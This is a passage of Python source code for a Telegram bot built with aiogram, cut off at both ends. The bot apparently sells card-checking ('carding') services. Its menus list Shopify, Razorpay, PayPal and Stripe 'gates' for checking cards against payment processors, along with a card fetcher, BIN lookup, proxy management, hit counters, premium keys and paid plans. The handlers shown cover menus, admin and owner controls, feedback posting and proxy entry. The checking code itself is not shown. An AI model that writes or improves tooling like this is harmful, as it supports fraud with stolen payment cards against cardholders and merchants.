    
    # Row 1: Gates, Tools
    builder.row(
        InlineKeyboardButton(
            text="Gates",
            callback_data="submenu_gates",
            icon_custom_emoji_id=CUSTOM_EMOJI["GATES"],
            style="primary"
        ),
        InlineKeyboardButton(
            text="Tools",
            callback_data="submenu_tools",
            icon_custom_emoji_id=CUSTOM_EMOJI["TOOLS"],
            style="primary"
        )
    )
    
    # Row 2: Help, Admin
    builder.row(
        InlineKeyboardButton(
            text="Help",
            callback_data="submenu_help",
            icon_custom_emoji_id=CUSTOM_EMOJI["HELP"],
            style="primary"
        ),
        InlineKeyboardButton(
            text="Admin",
            callback_data="submenu_admin",
            icon_custom_emoji_id=CUSTOM_EMOJI["ADMIN"],
            style="primary"
        )
    )
    
    # Row 3: Owner Cmds (centered) - only visible to owner
    if user_id == OWNER_ID:
        builder.row(
            InlineKeyboardButton(
                text="Owner Cmds",
                callback_data="submenu_owner",
                icon_custom_emoji_id=CUSTOM_EMOJI["OWNER"],
                style="primary"
            )
        )
    
    # Row 4: Back (centered)
    builder.row(
        InlineKeyboardButton(
            text="Back",
            callback_data="menu_start",
            icon_custom_emoji_id=CUSTOM_EMOJI["BACK"],
            style="danger"
        )
    )
    
    # Adjust layout based on whether Owner button is shown
    if user_id == OWNER_ID:
        builder.adjust(2, 2, 1, 1)
    else:
        builder.adjust(2, 2, 1)
    
    commands_text = premium_emoji("📝 <b>Commands Menu</b>\n\n")
    commands_text += premium_emoji("⚠️ <b>Select a category:</b>\n")
    commands_text += "Choose a category below to view commands:"
    
    # Edit media to preserve the same GIF
    await callback.message.edit_media(
        media=InputMediaAnimation(media=current_gif_id, caption=commands_text, parse_mode="HTML"),
        reply_markup=builder.as_markup()
    )
    await callback.answer()

@aiogram_router.callback_query(F.data == "menu_gates")
async def callback_menu_gates(callback: CallbackQuery):
    """Handle callback to gates menu (same as submenu_gates)."""
    await callback_menu_gates_submenu(callback)

@aiogram_router.callback_query(F.data == "submenu_gates")
async def callback_menu_gates_submenu(callback: CallbackQuery):
    """Handle callback to gates submenu - preserve current GIF."""
    from aiogram.types import InputMediaAnimation
    
    # Get current GIF file_id to preserve it
    current_gif_id = callback.message.animation.file_id
    
    gates_text = (
    f"{premium_emoji('🚀')} <b>Gates Commands</b>\n\n"
    f"{premium_emoji('🪙')} <b>Shopify Checker</b>\n"
    f"Cmd: <code>/sh</code> | <code>/msh</code> | <code>/mtxt</code>\n"
    f"Status: Active {premium_emoji('💡')}\n\n"
    f"{premium_emoji('🪙')} <b>Razorpay Checker</b>\n"
    f"Cmd: <code>/rz</code> | <code>/mrz</code>\n"
    f"Status: Off {premium_emoji('🔴')}\n\n"
    f"{premium_emoji('🪙')} <b>PayPal Checker</b>\n"
    f"Cmd: <code>/pp</code> | <code>/mpp</code>\n"
    f"Status: Active {premium_emoji('💡')}\n\n"
    f"{premium_emoji('🪙')} <b>Stripe Auth Gate</b>\n"
    f"Cmd: <code>/chk</code> | <code>/mchk</code>\n"
    f"Status: Active {premium_emoji('💡')}"    
)
    
    from aiogram.utils.keyboard import InlineKeyboardBuilder
    builder = InlineKeyboardBuilder()
    builder.row(InlineKeyboardButton(
        text="Back",
        callback_data="menu_commands",
        icon_custom_emoji_id=CUSTOM_EMOJI["BACK"],
        style="danger"
    ))
    
    # Edit media to preserve the same GIF
    await callback.message.edit_media(
        media=InputMediaAnimation(media=current_gif_id, caption=gates_text, parse_mode="HTML"),
        reply_markup=builder.as_markup()
    )
    await callback.answer()

@aiogram_router.callback_query(F.data == "submenu_tools")
async def callback_menu_tools_submenu(callback: CallbackQuery):
    """Handle callback to tools submenu - preserve current GIF."""
    from aiogram.types import InputMediaAnimation
    
    # Get current GIF file_id to preserve it
    current_gif_id = callback.message.animation.file_id
    
    tools_text = f"{premium_emoji('🛠')} <b>Tools Commands</b>\n\n"
    tools_text += "• <code>/px</code> - Proxy Checker TXT/List\n"
    tools_text += "• <code>/fl</code> - Fast Card Fetcher & Parser\n"
    tools_text += "• <code>/bin</code> - BIN Lookup\n"
    tools_text += "• <code>/info</code> - Check Profile & Total Hits\n"
    tools_text += "• <code>/redeem</code> - Activate Premium Key\n"
    
    from aiogram.utils.keyboard import InlineKeyboardBuilder
    builder = InlineKeyboardBuilder()
    builder.row(InlineKeyboardButton(
        text="Back",
        callback_data="menu_commands",
        icon_custom_emoji_id=CUSTOM_EMOJI["BACK"],
        style="danger"
    ))
    
    # Edit media to preserve the same GIF
    await callback.message.edit_media(
        media=InputMediaAnimation(media=current_gif_id, caption=tools_text, parse_mode="HTML"),
        reply_markup=builder.as_markup()
    )
    await callback.answer()

@aiogram_router.callback_query(F.data == "submenu_help")
async def callback_menu_help_submenu(callback: CallbackQuery):
    """Handle callback to help submenu - preserve current GIF."""
    from aiogram.types import InputMediaAnimation
    
    # Get current GIF file_id to preserve it
    current_gif_id = callback.message.animation.file_id
    
    help_text = premium_emoji("📝 <b>Help Menu</b>\n\n")
    help_text += premium_emoji("⚠️ <b>How to use the bot:</b>\n\n")
    help_text += "• Use <code>/start</code> to open the main menu\n"
    help_text += "• Navigate using inline buttons\n"
    help_text += "• Use commands directly in chat\n"
    help_text += "• Check your status with <code>/register</code>\n\n"   
    help_text += premium_emoji("🌐 <b>Site Configuration:</b>\n\n")
    help_text += "• <code>/add</code> - Add Sites with Price Filtering\n"
    help_text += "• <code>/rm</code> - Remove Site (Use <code>/rm all</code> to clear)\n"
    help_text += "• <code>/check</code> - Verify Working Sites\n\n"
    help_text += premium_emoji("⌛ <b>Proxy Management:</b>\n\n")
    help_text += "• <code>/addpxy</code> - Add proxy to list\n"
    help_text += "• <code>/proxy</code> - View current proxies\n"
    help_text += "• <code>/rmpxy</code> - Remove proxy from list\n"
    help_text += "• <code>/px</code> - Check proxy validity\n" 
    
    from aiogram.utils.keyboard import InlineKeyboardBuilder
    builder = InlineKeyboardBuilder()
    builder.row(InlineKeyboardButton(
        text="Back",
        callback_data="menu_commands",
        icon_custom_emoji_id=CUSTOM_EMOJI["BACK"],
        style="danger"
    ))
    
    # Edit media to preserve the same GIF
    await callback.message.edit_media(
        media=InputMediaAnimation(media=current_gif_id, caption=help_text, parse_mode="HTML"),
        reply_markup=builder.as_markup()
    )
    await callback.answer()

@aiogram_router.callback_query(F.data == "submenu_admin")
async def callback_menu_admin_submenu(callback: CallbackQuery):
    """Handle callback to admin submenu."""
    user_id = callback.from_user.id
    
    # Check if user is admin
    if not is_admin(user_id):
        from aiogram.types import InputMediaAnimation
        
        # Get current GIF file_id to preserve it
        current_gif_id = callback.message.animation.file_id
        
        error_text = premium_emoji("❌ <b>Access Denied</b>\n\n")
        error_text += "This menu is only available to administrators."
        
        from aiogram.utils.keyboard import InlineKeyboardBuilder
        builder = InlineKeyboardBuilder()
        builder.row(InlineKeyboardButton(
            text="Back",
            callback_data="menu_commands",
            icon_custom_emoji_id=CUSTOM_EMOJI["BACK"],
            style="danger"
        ))
        
        # Edit media to preserve the same GIF
        await callback.message.edit_media(
            media=InputMediaAnimation(media=current_gif_id, caption=error_text, parse_mode="HTML"),
            reply_markup=builder.as_markup()
        )
        await callback.answer()
        return
    
    from aiogram.types import InputMediaAnimation
    
    # Get current GIF file_id to preserve it
    current_gif_id = callback.message.animation.file_id
    
    from aiogram.utils.keyboard import InlineKeyboardBuilder
    builder = InlineKeyboardBuilder()
    
    # Back button (centered)
    builder.row(
        InlineKeyboardButton(
            text="Back",
            callback_data="menu_commands",
            icon_custom_emoji_id=CUSTOM_EMOJI["BACK"],
            style="danger"
        )
    )
    
    builder.adjust(1)
    
    admin_text = (
        f"<tg-emoji emoji-id='{PREMIUM_EMOJI_IDS['⚡']}'>🛠️</tg-emoji> <b>Admin Control Panel</b>\n\n"
        f"• <code>/active</code> - Monitor Live Sessions\n"
        f"• <code>/bc [msg]</code> - Broadcast Message\n"
        f"• <code>/msg [id] [msg]</code> - Direct Message\n\n"
        f"• <code>/kill [batch_id]</code> - Kill Batch\n\n"
        f"• <code>/reboot</code> - System Restart\n\n"
        f"• <code>/ban</code> | <code>/unban</code> | <code>/unauth</code> - Other cmds\n\n"
        f"Use these text commands directly in the chat input."
    )
    
    # Edit media to preserve the same GIF
    await callback.message.edit_media(
        media=InputMediaAnimation(media=current_gif_id, caption=admin_text, parse_mode="HTML"),
        reply_markup=builder.as_markup()
    )
    await callback.answer()

@aiogram_router.callback_query(F.data == "submenu_owner")
async def callback_menu_owner_submenu(callback: CallbackQuery):
    """Handle callback to owner submenu - preserve current GIF."""
    from aiogram.types import InputMediaAnimation
    
    # Get current GIF file_id to preserve it
    current_gif_id = callback.message.animation.file_id
    
    user_id = callback.from_user.id
    
    # Check if user is owner
    if user_id != OWNER_ID:
        error_text = premium_emoji("❌ <b>Access Denied</b>\n\n")
        error_text += "This menu is only available to the bot owner."
        
        from aiogram.utils.keyboard import InlineKeyboardBuilder
        builder = InlineKeyboardBuilder()
        builder.row(InlineKeyboardButton(
            text="Back",
            callback_data="menu_commands",
            icon_custom_emoji_id=CUSTOM_EMOJI["BACK"],
            style="danger"
        ))
        
        # Edit media to preserve the same GIF
        await callback.message.edit_media(
            media=InputMediaAnimation(media=current_gif_id, caption=error_text, parse_mode="HTML"),
            reply_markup=builder.as_markup()
        )
        await callback.answer()
        return
    
    from aiogram.utils.keyboard import InlineKeyboardBuilder
    builder = InlineKeyboardBuilder()
    
    # Back button (centered)
    builder.row(
        InlineKeyboardButton(
            text="Back",
            callback_data="menu_commands",
            icon_custom_emoji_id=CUSTOM_EMOJI["BACK"],
            style="danger"
        )
    )
    
    builder.adjust(1)
    
    owner_text = (
        f"<tg-emoji emoji-id='{PREMIUM_EMOJI_IDS['👑']}'>👑</tg-emoji> <b>Owner System Core</b>\n\n"
        f"• <code>/stats [user_id]</code> - Get bot status\n"
        f"• <code>/logs [user_id]</code> - Export Activity Logs\n"
        f"• <code>/up [msg]</code> - Upload a file to database\n\n"
        f"• <code>/maintenance</code> | <code>/release</code> - Put the bot & gate under maintenance\n\n"
        f"• <code>/promote</code> | <code>/unpromote</code> - Promote user to Admin status\n\n"
        f"• <code>/auth</code> | <code>/key</code> | <code>/ban</code> | <code>/unban</code> - Other cmds\n\n"
        f"System commands are reserved exclusively for the bot creator."
    )
    
    # Edit media to preserve the same GIF
    await callback.message.edit_media(
        media=InputMediaAnimation(media=current_gif_id, caption=owner_text, parse_mode="HTML"),
        reply_markup=builder.as_markup()
    )
    await callback.answer()

@aiogram_router.callback_query(F.data == "menu_update")
async def callback_menu_update(callback: CallbackQuery):
    """Handle callback to update menu - preserve current GIF."""
    from aiogram.types import InputMediaAnimation
    
    # Get current GIF file_id to preserve it
    current_gif_id = callback.message.animation.file_id
    
    from aiogram.utils.keyboard import InlineKeyboardBuilder
    builder = InlineKeyboardBuilder()
    builder.row(InlineKeyboardButton(
        text="Back to Menu",
        callback_data="menu_start",
        icon_custom_emoji_id=CUSTOM_EMOJI["BACK"],
        style="danger"
    ))
    
    update_text = premium_emoji("🔄 <b>Update Information</b>\n\n")
    update_text += "━━━━━━━━━━━━━━━━━━\n"
    update_text += "📊 <b>Current Version:</b> <code>v3.0</code>\n"
    update_text += "📅 <b>Last Updated:</b> <code>2026-06-06</code>\n"
    update_text += "━━━━━━━━━━━━━━━━━━\n\n"
    update_text += "✅ <b>Bot is up to date!</b>"
    
    # Edit media to preserve the same GIF
    await callback.message.edit_media(
        media=InputMediaAnimation(media=current_gif_id, caption=update_text, parse_mode="HTML"),
        reply_markup=builder.as_markup()
    )
    await callback.answer()

# --- GENERIC CALLBACK HANDLERS FOR SUBMENUS ---
@aiogram_router.callback_query(F.data.startswith("cmd_"))
async def callback_command_info(callback: CallbackQuery):
    """Handle generic command callbacks - show command info - preserve current GIF."""
    from aiogram.types import InputMediaAnimation
    
    # Get current GIF file_id to preserve it
    current_gif_id = callback.message.animation.file_id
    
    command = callback.data.replace("cmd_", "")
    
    command_descriptions = {
        "rz": "Razorpay Check - Check cards against Razorpay gateway",
        "pp": "PayPal Check - Check cards against PayPal gateway",
        "sh": "Shopify Check - Check cards against Shopify sites",
        "chk": "Stripe Auth Check - Check cards with Stripe authentication",
        "px": "Proxy Checker - Check proxy validity",
        "fl": "Card Fetcher - Extract cards from text/files",
        "bin": "BIN Lookup - Get BIN information"
    }
    
    desc = command_descriptions.get(command, "Unknown command")
    
    info_text = premium_emoji(f"ℹ️ <b>Command: /{command}</b>\n\n")
    info_text += "━━━━━━━━━━━━━━━━━━\n"
    info_text += f"📝 <b>Description:</b> {desc}\n"
    info_text += "━━━━━━━━━━━━━━━━━━"
    
    from aiogram.utils.keyboard import InlineKeyboardBuilder
    builder = InlineKeyboardBuilder()
    builder.row(InlineKeyboardButton(
        text="Back",
        callback_data="menu_commands",
        icon_custom_emoji_id=CUSTOM_EMOJI["BACK"],
        style="danger"
    ))
    
    # Edit media to preserve the same GIF
    await callback.message.edit_media(
        media=InputMediaAnimation(media=current_gif_id, caption=info_text, parse_mode="HTML"),
        reply_markup=builder.as_markup()
    )
    await callback.answer()

@aiogram_router.callback_query(F.data.startswith("help_"))
async def callback_help_info(callback: CallbackQuery):
    """Handle help callbacks - preserve current GIF."""
    from aiogram.types import InputMediaAnimation
    
    # Get current GIF file_id to preserve it
    current_gif_id = callback.message.animation.file_id
    
    help_type = callback.data.replace("help_", "")
    
    if help_type == "guide":
        help_text = premium_emoji("📖 <b>User Guide</b>\n\n")
        help_text += "━━━━━━━━━━━━━━━━━━\n"
        help_text += "🎯 <b>Getting Started:</b>\n\n"
        help_text += "1. Use <code>/start</code> to open the main menu\n"
        help_text += "2. Navigate using inline buttons\n"
        help_text += "3. Use commands directly in chat\n"
        help_text += "4. Check your status with <code>/register</code>\n"
        help_text += "━━━━━━━━━━━━━━━━━━"
    elif help_type == "support":
        help_text = premium_emoji("🆘 <b>Contact Support</b>\n\n")
        help_text += "━━━━━━━━━━━━━━━━━━\n"
        help_text += "📞 <b>Support:</b> @Mr_Bad_Guy\n"
        help_text += "📧 <b>Email:</b> support@example.com\n"
        help_text += "━━━━━━━━━━━━━━━━━━"
    else:
        help_text = premium_emoji("❓ <b>Help</b>\n\n")
        help_text += "Select an option from the menu."
    
    from aiogram.utils.keyboard import InlineKeyboardBuilder
    builder = InlineKeyboardBuilder()
    builder.row(InlineKeyboardButton(
        text="Back",
        callback_data="submenu_help",
        icon_custom_emoji_id=CUSTOM_EMOJI["BACK"],
        style="danger"
    ))
    
    # Edit media to preserve the same GIF
    await callback.message.edit_media(
        media=InputMediaAnimation(media=current_gif_id, caption=help_text, parse_mode="HTML"),
        reply_markup=builder.as_markup()
    )
    await callback.answer()

@aiogram_router.callback_query(F.data.startswith("admin_"))
async def callback_admin_info(callback: CallbackQuery):
    """Handle admin callbacks - preserve current GIF."""
    from aiogram.types import InputMediaAnimation
    
    # Get current GIF file_id to preserve it
    current_gif_id = callback.message.animation.file_id
    
    admin_type = callback.data.replace("admin_", "")
    
    admin_descriptions = {
        "active": "View active checking sessions",
        "broadcast": "Send broadcast message to all users",
        "maintenance": "Toggle maintenance mode"
    }
    
    desc = admin_descriptions.get(admin_type, "Unknown admin function")
    
    info_text = premium_emoji(f"🔐 <b>Admin: {admin_type.title()}</b>\n\n")
    info_text += "━━━━━━━━━━━━━━━━━━\n"
    info_text += f"📝 <b>Description:</b> {desc}\n"
    info_text += "━━━━━━━━━━━━━━━━━━\n\n"
    info_text += "⚠️ <b>Use this command in the main chat.</b>"
    
    back_markup = {
        "inline_keyboard": [
            [
                {
                    "text": "Back",
                    "callback_data": "submenu_admin",
                    "icon_custom_emoji_id": CUSTOM_EMOJI["BACK"],
                    "style": "danger"
                }
            ]
        ]
    }
    
    keyboard = build_custom_keyboard(back_markup)
    
    # Edit media to preserve the same GIF
    await callback.message.edit_media(
        media=InputMediaAnimation(media=current_gif_id, caption=info_text, parse_mode="HTML"),
        reply_markup=keyboard
    )
    await callback.answer()

@aiogram_router.callback_query(F.data == "close_menu")
async def callback_close_menu(callback: CallbackQuery):
    """Handle close menu callback - delete entire message."""
    try:
        await callback.message.delete()
    except Exception:
        pass
    await callback.answer("Menu closed.")

@aiogram_router.message(Command("info"))
async def aiogram_info_handler(message: Message):
    if await is_banned_user(message.from_user.id):
        await message.answer(premium_emoji("❌ <b>You are banned from using this bot.</b>"), parse_mode="HTML")
        return

    args = message.text.split(maxsplit=1)[1] if message.text and len(message.text.split()) > 1 else None
    uid_to_query, user_name, error = await resolve_info_target(
        message.from_user.id,
        args,
        fallback_name=message.from_user.first_name or "User"
    )
    if error:
        await message.answer(
            f"{premium_emoji('⚠️')} <b>𝖭𝖮𝖳𝖨𝖢𝖤:</b> <code>{error}</code>",
            parse_mode="HTML"
        )
        return

    INFO_VIEW_CACHE[message.from_user.id] = uid_to_query
    info_text = await build_info_dashboard(uid_to_query, user_name)
    await message.answer(info_text, reply_markup=build_info_keyboard(), parse_mode="HTML")

@aiogram_router.message(Command("fb"))
async def fb_command_handler(message: Message, state: FSMContext):
    if await is_banned_user(message.from_user.id):
        await message.answer(premium_emoji("❌ <b>You are banned from using this bot.</b>"), parse_mode="HTML")
        return

    # Store original user info
    user = message.from_user
    await state.update_data(
        user_id=user.id,
        username=user.username,
        first_name=user.first_name
    )
    
    await state.set_state(FeedbackFlow.identity_preference)
    
    from aiogram.utils.keyboard import InlineKeyboardBuilder
    builder = InlineKeyboardBuilder()
    builder.row(
        InlineKeyboardButton(
            text="Show Identity",
            callback_data="fb_anon:false",
            icon_custom_emoji_id=PREMIUM_EMOJI_IDS["✅"],
            style="primary"
        ),
        InlineKeyboardButton(
            text="Go Anonymous",
            callback_data="fb_anon:true",
            icon_custom_emoji_id=PREMIUM_EMOJI_IDS["👽"],
            style="primary"
        )
    )
    builder.row(
        InlineKeyboardButton(
            text="Cancel Process",
            callback_data="fb_cancel",
            icon_custom_emoji_id=PREMIUM_EMOJI_IDS["❌"],
            style="danger"
        )
    )
    
    await message.answer(
        premium_emoji("📝 <b>Feedback Submission</b>\n\nChoose your visibility preference:"),
        reply_markup=builder.as_markup(),
        parse_mode="HTML"
    )

@aiogram_router.callback_query(F.data.startswith("fb_anon:"))
async def fb_identity_callback(callback: CallbackQuery, state: FSMContext):
    is_anonymous = callback.data.split(":")[1] == "true"
    
    await state.update_data(is_anonymous=is_anonymous)
    await state.set_state(FeedbackFlow.awaiting_media)
    
    from aiogram.utils.keyboard import InlineKeyboardBuilder
    builder = InlineKeyboardBuilder()
    builder.row(
        InlineKeyboardButton(
            text="Cancel",
            callback_data="fb_cancel",
            icon_custom_emoji_id=PREMIUM_EMOJI_IDS["❌"],
            style="danger"
        )
    )
    
    await callback.message.edit_text(
        premium_emoji("📸 <b>Send Media</b>\n\nPlease send a photo or video with your feedback."),
        reply_markup=builder.as_markup(),
        parse_mode="HTML"
    )
    await callback.answer()

@aiogram_router.callback_query(F.data == "fb_cancel")
async def fb_cancel_callback(callback: CallbackQuery, state: FSMContext):
    await state.clear()
    await callback.message.edit_text(
        premium_emoji("❌ <b>Feedback process cancelled.</b>"),
        parse_mode="HTML"
    )
    await callback.answer()

@aiogram_router.callback_query(F.data == "fb_skip_text")
async def fb_skip_text_callback(callback: CallbackQuery, state: FSMContext):
    data = await state.get_data()
    is_anonymous = data.get("is_anonymous", False)
    
    # Delete the prompt message
    prompt_message_id = data.get("prompt_message_id")
    if prompt_message_id:
        try:
            await callback.message.bot.delete_message(callback.message.chat.id, prompt_message_id)
        except Exception:
            pass
    
    # Submit feedback immediately without waiting for media
    await submit_feedback(callback.message, state, is_anonymous)
    await callback.answer()

@aiogram_router.callback_query(F.data == "view_plans")
async def feedback_view_plans_callback(callback: CallbackQuery):
    """Handle view_plans callback from feedback channel - show plans to user"""
    plans_text, _ = get_buy_panel_text(include_contact_link=True)
    try:
        await callback.message.edit_text(
            plans_text,
            reply_markup=build_plans_keyboard(),
            parse_mode="HTML"
        )
    except Exception:
        # If edit fails, try sending a new message
        try:
            await callback.message.answer(
                plans_text,
                reply_markup=build_plans_keyboard(),
                parse_mode="HTML"
            )
        except Exception:
            pass
    await callback.answer()

@aiogram_router.message(F.photo, FeedbackFlow.awaiting_media)
@aiogram_router.message(F.video, FeedbackFlow.awaiting_media)
@aiogram_router.message(F.media_group_id, FeedbackFlow.awaiting_media)
async def fb_media_handler(message: Message, state: FSMContext):
    data = await state.get_data()
    is_anonymous = data.get("is_anonymous", False)
    
    # Store media info (support albums)
    if message.media_group_id:
        # Handle album - collect all media from the group
        media_file_ids = data.get("media_file_ids", [])
        processed_groups = data.get("processed_media_groups", [])
        
        # Always add the media to the list
        if message.photo:
            media_file_ids.append(message.photo[-1].file_id)
        elif message.video:
            media_file_ids.append(message.video.file_id)
        
        media_type = "album"
        caption = message.caption or ""
        
        await state.update_data(
            media_file_ids=media_file_ids,
            media_type=media_type,
            caption=caption
        )
        
        # Only send confirmation if this is the first photo in the group
        if message.media_group_id not in processed_groups:
            # Mark this group as processed to avoid duplicate confirmations
            processed_groups.append(message.media_group_id)
            await state.update_data(processed_media_groups=processed_groups)
            
            # For albums, wait to collect all media, then proceed
            await asyncio.sleep(1.0)
            data = await state.get_data()
            
            if caption:
                await submit_feedback(message, state, is_anonymous)
            else:
                await state.set_state(FeedbackFlow.awaiting_text)
                from aiogram.utils.keyboard import InlineKeyboardBuilder
                builder = InlineKeyboardBuilder()
                builder.row(
                    InlineKeyboardButton(
                        text="Skip Text",
                        callback_data="fb_skip_text",
                        icon_custom_emoji_id=PREMIUM_EMOJI_IDS["🎯"],
                        style="primary"
                    ),
                    InlineKeyboardButton(
                        text="Cancel",
                        callback_data="fb_cancel",
                        icon_custom_emoji_id=PREMIUM_EMOJI_IDS["❌"],
                        style="danger"
                    )
                )
                photo_count = len(data.get("media_file_ids", []))
                prompt_msg = await message.answer(
                    premium_emoji(f"✅ <b>{photo_count} photo(s) received!</b>\n\nPlease send your feedback text, or click Skip Text to submit without text."),
                    reply_markup=builder.as_markup(),
                    parse_mode="HTML"
                )
                await state.update_data(prompt_message_id=prompt_msg.message_id)
    else:
        # Handle single media
        media_file_id = message.photo[-1].file_id if message.photo else message.video.file_id
        media_type = "photo" if message.photo else "video"
        caption = message.caption or ""
        
        await state.update_data(
            media_file_id=media_file_id,
            media_type=media_type,
            caption=caption
        )
        
        if caption:
            # If caption exists, submit directly
            await submit_feedback(message, state, is_anonymous)
        else:
            # Ask for text with skip and cancel buttons
            await state.set_state(FeedbackFlow.awaiting_text)
            from aiogram.utils.keyboard import InlineKeyboardBuilder
            builder = InlineKeyboardBuilder()
            builder.row(
                InlineKeyboardButton(
                    text="Skip Text",
                    callback_data="fb_skip_text",
                    icon_custom_emoji_id=PREMIUM_EMOJI_IDS["🎯"],
                    style="primary"
                ),
                InlineKeyboardButton(
                    text="Cancel",
                    callback_data="fb_cancel",
                    icon_custom_emoji_id=PREMIUM_EMOJI_IDS["❌"],
                    style="danger"
                )
            )
            prompt_msg = await message.answer(
                premium_emoji("✅ <b>Media received!</b>\n\nPlease send your feedback text, or click Skip Text to submit without text."),
                reply_markup=builder.as_markup(),
                parse_mode="HTML"
            )
            await state.update_data(prompt_message_id=prompt_msg.message_id)

@aiogram_router.message(F.text, FeedbackFlow.awaiting_text)
async def fb_text_handler(message: Message, state: FSMContext):
    data = await state.get_data()
    is_anonymous = data.get("is_anonymous", False)
    
    await state.update_data(text=message.text)
    
    # Delete the prompt message
    prompt_message_id = data.get("prompt_message_id")
    if prompt_message_id:
        try:
            await message.bot.delete_message(message.chat.id, prompt_message_id)
        except Exception:
            pass
    
    await submit_feedback(message, state, is_anonymous)

async def submit_feedback(message: Message, state: FSMContext, is_anonymous: bool):
    data = await state.get_data()
    
    # Get user info from state (stored at command start)
    user_id = data.get("user_id", message.from_user.id)
    username = data.get("username", message.from_user.username)
    first_name = data.get("first_name", message.from_user.first_name)
    
    # Apply anonymous mode
    username = "𝐇𝐢𝐝𝐝𝐞𝐧" if is_anonymous else (username or "Hidden")
    first_name = "𝐀𝐧𝐨𝐧𝐲𝐦𝐨𝐮𝐬" if is_anonymous else (first_name or "Hidden")
    
    # Build feedback message
    feedback_text = f"💎 <b>𝐅𝐞𝐞𝐝𝐛𝐚𝐜𝐤</b>\n\n"
    if not is_anonymous:
        feedback_text += f"<b>𝐅𝐫𝐨𝐦:</b> <a href=\"tg://user?id={user_id}\">{first_name}</a>"
    else:
        feedback_text += f"<b>𝐅𝐫𝐨𝐦:</b> {first_name}"
    feedback_text += f"\n<b>𝐈𝐃:</b> {user_id if not is_anonymous else 'Hidden'}\n\n"
    
    # Add text if provided
    if data.get("text"):
        feedback_text += f"<b>𝐌𝐞𝐬𝐬𝐚𝐠𝐞:</b>\n{data['text']}\n\n"
    elif data.get("caption"):
        feedback_text += f"<b>𝐌𝐞𝐬𝐬𝐚𝐠𝐞:</b>\n{data['caption']}"
    
    # Apply premium emoji to entire text
    feedback_text = premium_emoji(feedback_text)
    
    # Create buy button as link to bot in private chat
    bot_username = aiogram_bot.username if hasattr(aiogram_bot, 'username') else "cctanjiroBot"
    deep_link = f"https://t.me/{bot_username}?start=view_plan"
    
    from aiogram.utils.keyboard import InlineKeyboardBuilder
    builder = InlineKeyboardBuilder()
    builder.row(
        InlineKeyboardButton(
            text="Buy - View Plans",
            url=deep_link,
            icon_custom_emoji_id=PREMIUM_EMOJI_IDS["🚀"],
            style="primary"
        )
    )
    keyboard = builder.as_markup()
    
    # Send to feedback channel
    if FEEDBACK_CHANNEL_ID:
        try:
            if data.get("media_file_ids"):
                # Handle album (multiple photos)
                media_file_ids = data["media_file_ids"]
                
                # Create media group with caption on first image
                media_group = []
                for i, file_id in enumerate(media_file_ids):
                    if i == 0:
                        # First media gets the caption with HTML parse mode
                        media_group.append(InputMediaPhoto(
                            media=file_id,
                            caption=feedback_text,
                            parse_mode="HTML"
                        ))
                    else:
                        media_group.append(InputMediaPhoto(media=file_id))
                
                await message.bot.send_media_group(
                    FEEDBACK_CHANNEL_ID,
                    media=media_group
                )
                
                # Send button as separate message (media groups don't support reply_markup)
                await message.bot.send_message(
                    FEEDBACK_CHANNEL_ID,
                    premium_emoji("🚀 <b>Interested in Premium Access?</b>"),
                    reply_markup=keyboard,
                    parse_mode="HTML"
                )
            elif data.get("media_file_id"):
                # Handle single media
                if data["media_type"] == "photo":
                    await message.bot.send_photo(
                        FEEDBACK_CHANNEL_ID,
                        data["media_file_id"],
                        caption=feedback_text,
                        reply_markup=keyboard,
                        parse_mode="HTML"
                    )
                else:
                    await message.bot.send_video(
                        FEEDBACK_CHANNEL_ID,
                        data["media_file_id"],
                        caption=feedback_text,
                        reply_markup=keyboard,
                        parse_mode="HTML"
                    )
            else:
                # Text only
                await message.bot.send_message(
                    FEEDBACK_CHANNEL_ID,
                    feedback_text,
                    reply_markup=keyboard,
                    parse_mode="HTML"
                )
            
            await message.answer(
                premium_emoji("✅ <b>Feedback submitted successfully!</b>\n\nThank you for your feedback."),
                parse_mode="HTML"
            )
        except Exception as e:
            await message.answer(
                premium_emoji(f"❌ <b>Error submitting feedback:</b> {str(e)}"),
                parse_mode="HTML"
            )
    else:
        await message.answer(
            premium_emoji("⚠️ <b>Feedback channel not configured.</b>\n\nPlease contact the bot administrator."),
            parse_mode="HTML"
        )
    
    await state.clear()

@aiogram_router.callback_query(F.data == "view_plans")
async def callback_view_plans(callback: CallbackQuery):
    plans_text, _ = get_buy_panel_text(include_contact_link=False)
    try:
        await callback.message.edit_text(
            plans_text,
            reply_markup=build_plans_keyboard(),
            parse_mode="HTML"
        )
    except Exception:
        await callback.message.answer(
            plans_text,
            reply_markup=build_plans_keyboard(),
            parse_mode="HTML"
        )
    await callback.answer()

@aiogram_router.callback_query(F.data == "set_user_proxy")
async def callback_set_user_proxy(callback: CallbackQuery, state: FSMContext):
    # Check if command is used in private chat
    if callback.message.chat.type != "private":
        await callback.answer("This command only works in private chat!", show_alert=True)
        await callback.message.answer("💎 𝙏𝙝𝙞𝙨 𝙘𝙤𝙢𝙢𝙖𝙣𝙙 𝙤𝙣𝙡𝙮 𝙬𝙤𝙧𝙠𝙨 𝙞𝙣 𝙥𝙧𝙞𝙫𝙖𝙩𝙚 𝙘𝙝𝙖𝙩!")
        return
    
    await state.set_state(ProxyFlow.enter_proxy)
    await callback.message.answer(
        premium_emoji(
            f"{premium_emoji('⚙️')} <b>𝖯𝖱𝖮𝖷𝖸 𝖲𝖤𝖳𝖴𝖯</b>\n"
            f"━━━━━━━━━━━━━━━━━━━━━━\n\n"
            f"{premium_emoji('📝')} <b>Send your proxy in one of these formats:</b>\n"
            f"⇾ <code>ip:port</code>\n"
            f"⇾ <code>ip:port:username:password</code>\n\n"
            f"{premium_emoji('💡')} <i>Or use</i> <code>/addpxy</code> <i>to import multiple proxies.</i>"
        ),
        parse_mode="HTML"
    )
    await callback.answer()

@aiogram_router.message(StateFilter(ProxyFlow.enter_proxy))
async def proxy_flow_enter_proxy(message: Message, state: FSMContext):
    if await is_banned_user(message.from_user.id):
        await state.clear()
        return

    proxy_text = (message.text or "").strip()
    if not proxy_text:
        await message.answer(
            premium_emoji(f"{premium_emoji('⚠️')} <b>𝖭𝖮𝖳𝖨𝖢𝖤:</b> <code>Please send a valid proxy string.</code>"),
            parse_mode="HTML"
        )
        return

    proxy_data = parse_proxy_format(proxy_text)
    if not proxy_data:
        await message.answer(
            premium_emoji(
                f"{premium_emoji('❌')} <b>Invalid proxy format.</b>\n\n"
                f"{premium_emoji('📝')} <code>ip:port</code> or <code>ip:port:user:pass</code>"
            ),
            parse_mode="HTML"
        )
        return

    status_msg = await message.answer(
        premium_emoji(f"{premium_emoji('⏳')} <b>Testing proxy connection...</b>"),
        parse_mode="HTML"
    )

    is_working, ip_info = await test_proxy(proxy_data["proxy_url"])
    if not is_working:
